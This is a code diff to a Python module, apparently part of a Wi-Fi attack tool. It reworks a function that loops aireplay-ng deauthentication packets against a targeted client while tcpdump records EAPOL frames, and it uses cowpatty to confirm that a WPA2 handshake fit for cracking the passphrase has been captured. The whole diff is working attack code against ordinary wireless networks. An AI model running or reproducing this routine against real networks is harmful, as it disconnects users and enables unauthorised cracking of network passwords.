@@ -4,6 +4,7 @@ from packet import decap, scan_macadress
 from subprocess import Popen, PIPE
 from datetime import datetime
 from mac_vendor_lookup import MacLookup
+import queue
 import signal
 import os
 import json
@@ -219,7 +220,48 @@ def get_client_list(session_id):
         db_session.close()
         return { 'data': None }
 
-def force_eapol_handshake(session_id, client_data):
+# def force_eapol_handshake(session_id, client_data):
+#     # Retrieves AP MAC
+#     session_obj = db_session.query(Session).filter(Session.id == session_id).one()
+#     ap_mac = session_obj.mac
+#     client_data = json.loads(client_data)
+#     client_mac = client_data['Station MAC']
+
+#     # Switches channel of wireless adapter
+#     Popen(['iwconfig', 'wlan0', 'channel', str(session_obj.channel)], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+
+#     # Filter and capture EAPOL handshake using tcpdump
+#     expression = 'ether proto 0x888e and (wlan addr1 '+ap_mac+' or wlan addr1 '+client_mac+')'
+#     process = Popen(['tcpdump', '-i', 'wlan0', '-l', '-vvv', '-w', 'eapol.cap', expression], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+
+#     Popen(['aireplay-ng', '-0', '5', '-a', ap_mac, '-c', client_mac, 'wlan0'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+
+#     sleep(15) # Time (in seconds) to stop the tcpdump
+#     process.send_signal(signal.SIGINT)
+#     (), stderr = process.communicate()
+#     process.terminate()
+#     process.kill()
+
+#     # Use string of stderr to find the number of packets captured
+#     stderr = stderr.decode('utf-8').split('\n')[1].split('\r')
+#     no_eapol_packets = int(stderr[len(stderr) - 1][0])
+
+#     print('{} eapol packets captured'.format(no_eapol_packets))
+#     # Only return success if number of eapol packets > 4
+#     # This portion needs to be replaced with pyrit
+#     if no_eapol_packets >= 4:
+#         # Adds client into SessionClient table
+#         newSessionClient_obj = SessionClient(session_id=session_obj.id, mac=client_mac, vendor=client_data['vendor'], is_ap=False)
+#         db_session.add(newSessionClient_obj)
+#         db_session.commit()
+
+#         db_session.close()
+#         return True
+#     else:
+#         db_session.close()
+#         return False
+
+def eapol_capture_start(session_id, client_data, queue):
     # Retrieves AP MAC
     session_obj = db_session.query(Session).filter(Session.id == session_id).one()
     ap_mac = session_obj.mac
@@ -231,34 +273,45 @@ def force_eapol_handshake(session_id, client_data):
 
     # Filter and capture EAPOL handshake using tcpdump
     expression = 'ether proto 0x888e and (wlan addr1 '+ap_mac+' or wlan addr1 '+client_mac+')'
-    process = Popen(['tcpdump', '-i', 'wlan0', '-l', '-vvv', '-w', 'eapol.cap', expression], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    tcpdump_process = Popen(['tcpdump', '-i', 'wlan0', '-l', '-vvv', '--packet-buffered', '-w', 'eapol.cap', expression], stdin=PIPE, stdout=PIPE, stderr=PIPE)
 
-    Popen(['aireplay-ng', '-0', '5', '-a', ap_mac, '-c', client_mac, 'wlan0'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    global is_running_process
+    is_running_process = True
+    while is_running_process:
+        # While process is running, sends deauth packet and check if there is EAPOL handshake using cowpatty
+        Popen(['aireplay-ng', '-0', '5', '-a', ap_mac, '-c', client_mac, 'wlan0'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+        sleep(10)
 
-    sleep(15) # Time (in seconds) to stop the tcpdump
-    process.send_signal(signal.SIGINT)
-    (), stderr = process.communicate()
-    process.terminate()
-    process.kill()
+        # sleep for 10 seconds then check if cowpatty receives it
+        cowpatty_process = Popen(['cowpatty', '-r', 'eapol.cap', '-c'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+        stdout, () = cowpatty_process.communicate()
 
-    # Use string of stderr to find the number of packets captured
-    stderr = stderr.decode('utf-8').split('\n')[1].split('\r')
-    no_eapol_packets = int(stderr[len(stderr) - 1][0])
+        # Output of cowpatty will be something like this:
+        # Collected all necessary data to mount crack against WPA2/PSK passphrase.
+        if "Collected all" in stdout.decode('utf-8'):
+            tcpdump_process.terminate()
+            tcpdump_process.kill()
 
-    print('{} eapol packets captured'.format(no_eapol_packets))
-    # Only return success if number of eapol packets > 4
-    # This portion needs to be replaced with pyrit
-    if no_eapol_packets >= 4:
-        # Adds client into SessionClient table
-        newSessionClient_obj = SessionClient(session_id=session_obj.id, mac=client_mac, vendor=client_data['vendor'], is_ap=False)
-        db_session.add(newSessionClient_obj)
-        db_session.commit()
+            # Adds client into SessionClient table
+            newSessionClient_obj = SessionClient(session_id=session_obj.id, mac=client_mac, vendor=client_data['vendor'], is_ap=False)
+            db_session.add(newSessionClient_obj)
+            db_session.commit()
+            db_session.close()
 
-        db_session.close()
-        return True
-    else:
-        db_session.close()
-        return False
+            is_running_process = False
+            queue.put(True)
+            return
+
+    # Else, continue the process until it is collected, or the user stops the process
+    # When is_running_process becomes false, terminate the tcpdump
+    tcpdump_process.terminate()
+    tcpdump_process.kill()
+    db_session.close()
+    queue.put(False)
+
+def eapol_capture_stop():
+    global is_running_process
+    is_running_process = False
 
 def get_is_active():
     # Check if any session is active and restricts the user from creating
